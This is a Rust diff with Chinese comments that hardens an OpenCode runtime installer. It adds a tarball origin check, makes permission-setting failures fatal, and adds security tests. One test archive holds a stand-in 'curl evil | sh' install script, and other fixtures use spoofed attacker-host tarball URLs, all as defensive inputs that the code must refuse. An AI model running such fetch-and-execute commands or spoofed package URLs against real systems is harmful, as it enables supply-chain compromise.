@@ -336,6 +336,10 @@ fn valid_metadata(metadata: &Value, pkg: &RuntimePackage, registries: &[String])
     let Ok(tarball) = Url::parse(tarball_raw) else {
         return false;
     };
+    // 形状检查不够：被篡改的元数据可以把 tarball 指向站外却保留 `/包名/-/` 路径，
+    // 而 integrity 与 tarball 同源，sha512 因此不提供任何真实性。必须比 origin。
+    let tarball_origin = tarball.origin().ascii_serialization();
+    let path_prefix = format!("/{}/-/", pkg.name);
     metadata.get("name").and_then(Value::as_str) == Some(pkg.name.as_str())
         && is_version(metadata.get("version").and_then(Value::as_str).unwrap_or(""))
         && dist
@@ -346,7 +350,8 @@ fn valid_metadata(metadata: &Value, pkg: &RuntimePackage, registries: &[String])
             Url::parse(registry)
                 .map(|parsed| parsed.origin().ascii_serialization() == *registry)
                 .unwrap_or(false)
-                && tarball.path().starts_with(&format!("/{}/-/", pkg.name))
+                && tarball_origin == *registry
+                && tarball.path().starts_with(&path_prefix)
         })
 }
 
@@ -489,7 +494,10 @@ async fn install_latest(ctx: &Ctx, metadata: &LatestMetadata) -> Result<String, 
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
-        let _ = fs::set_permissions(&target, fs::Permissions::from_mode(0o755));
+        // 权限位拿不到就直接失败：后续 `--version` 回读只会抛出「跑不起来」的表象，
+        // 掩盖掉真正的原因（镜像不可执行 / 目录对外可读）。
+        fs::set_permissions(&target, fs::Permissions::from_mode(0o755))
+            .map_err(|error| format!("Failed to set managed OpenCode binary permissions: {error}"))?;
     }
 
     if ctx.probe(&target).await.as_deref() != Ok(metadata.version.as_str()) {
@@ -638,7 +646,8 @@ pub async fn find_runtime(
                         #[cfg(unix)]
                         {
                             use std::os::unix::fs::PermissionsExt;
-                            let _ = fs::set_permissions(&temp, fs::Permissions::from_mode(0o755));
+                            fs::set_permissions(&temp, fs::Permissions::from_mode(0o755))
+                                .map_err(|error| error.to_string())?;
                         }
                         replace_with_retry(Path::new(&temp), Path::new(&target))
                             .map_err(|error| error.to_string())
@@ -894,7 +903,10 @@ pub async fn start_backend(
         #[cfg(unix)]
         {
             use std::os::unix::fs::PermissionsExt;
-            let _ = fs::set_permissions(&dir, fs::Permissions::from_mode(0o700));
+            // 隔离目录里会有 OPENCODE_SERVER_PASSWORD 与配置副本，0700 是隔离红线的一部分：
+            // chmod 失败必须失败退出，不能留下一个组/其他用户可读的「隔离」目录。
+            fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))
+                .map_err(|error| format!("Failed to protect isolated OpenCode directory {dir}: {error}"))?;
         }
     }
     let password = generate_password();
@@ -1011,6 +1023,71 @@ pub async fn start_backend(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// 供应链红线：安装只取出 `package/bin/<binary>` 这一个成员。tarball 里的其他条目
+    /// （同包脚本、同目录的第二个二进制）必须一个字节都不落盘，否则"只取单个文件"退化成整包解压。
+    #[test]
+    fn extraction_only_takes_the_requested_tar_member() {
+        let dir = std::env::temp_dir().join(format!(
+            "wbbridge-tar-{}-{}",
+            std::process::id(),
+            line!()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("临时目录可建");
+        let archive = dir.join("pkg.tgz");
+        let out_file = dir.join("opencode");
+
+        {
+            let file = std::fs::File::create(&archive).expect("归档可建");
+            let mut builder =
+                tar::Builder::new(flate2::write::GzEncoder::new(file, flate2::Compression::default()));
+            let members: [(&str, &[u8]); 4] = [
+                ("package/install.sh", b"#!/bin/sh\ncurl evil | sh\n".as_slice()),
+                ("package/bin/helper", b"#!/bin/sh\necho helper\n".as_slice()),
+                ("package/bin/opencode", b"#!/bin/sh\necho ok\n".as_slice()),
+                ("package/docs/readme.md", b"docs\n".as_slice()),
+            ];
+            for (name, body) in members {
+                let mut header = tar::Header::new_gnu();
+                header.set_path(name).expect("成员路径可写");
+                header.set_size(body.len() as u64);
+                header.set_mode(0o755);
+                header.set_entry_type(tar::EntryType::Regular);
+                header.set_cksum();
+                builder.append(&header, body).expect("成员可写入归档");
+            }
+            builder.finish().expect("归档可收尾");
+        }
+
+        extract_runtime_member(
+            archive.to_str().expect("临时路径是 utf-8"),
+            "package/bin/opencode",
+            out_file.to_str().expect("临时路径是 utf-8"),
+        )
+        .expect("目标成员必须取出");
+        assert_eq!(std::fs::read(&out_file).expect("目标成员可读"), b"#!/bin/sh\necho ok\n");
+
+        // 目录里只剩归档本身与目标文件：其余成员从未被写出。
+        let mut names: Vec<String> = std::fs::read_dir(&dir)
+            .expect("临时目录可读")
+            .filter_map(|entry| entry.ok())
+            .map(|entry| entry.file_name().to_string_lossy().into_owned())
+            .collect();
+        names.sort();
+        assert_eq!(names, vec!["opencode".to_string(), "pkg.tgz".to_string()]);
+
+        // 目标成员缺失时必须报错，而不是回退去取别的成员。
+        let missing = extract_runtime_member(
+            archive.to_str().expect("临时路径是 utf-8"),
+            "package/bin/other",
+            dir.join("other").to_str().expect("临时路径是 utf-8"),
+        );
+        assert!(missing.is_err(), "缺失成员必须失败");
+        assert!(!dir.join("other").exists());
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
 
     fn env_of(pairs: &[(&str, &str)]) -> Env {
         pairs
@@ -1151,6 +1228,22 @@ mod tests {
         let external = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
             "dist": { "integrity": "sha512-abc", "tarball": "https://example.com/runtime.tgz" } });
         assert!(!valid_metadata(&external, &pkg, &registries));
+
+        // 路径形状完全合规、只有 origin 在站外：这是 origin 校验唯一能挡住的情形，
+        // 而 integrity 与 tarball 出自同一份元数据，sha512 在此不提供真实性。
+        let shaped_external = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
+            "dist": { "integrity": "sha512-abc", "tarball": "https://evil.example.com/opencode-darwin-arm64/-/opencode-darwin-arm64-1.25.7.tgz" } });
+        assert!(!valid_metadata(&shaped_external, &pkg, &registries), "站外 origin 必须拒绝");
+
+        // userinfo 伪装成白名单主机（真实 host 是 evil.example）：按 origin 判定，不得放过。
+        let userinfo_spoof = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
+            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmjs.org@evil.example/opencode-darwin-arm64/-/x.tgz" } });
+        assert!(!valid_metadata(&userinfo_spoof, &pkg, &registries), "userinfo 伪装必须拒绝");
+
+        // 白名单内的国内镜像同形状 tarball 仍须可用，别让修复变成只允许官方源。
+        let mirrored = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
+            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmmirror.com/opencode-darwin-arm64/-/opencode-darwin-arm64-1.25.7.tgz" } });
+        assert!(valid_metadata(&mirrored, &pkg, &registries), "白名单镜像必须放行");
 
         let weak = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
             "dist": { "integrity": "sha256-abc", "tarball": "https://registry.npmjs.org/opencode-darwin-arm64/-/x.tgz" } });
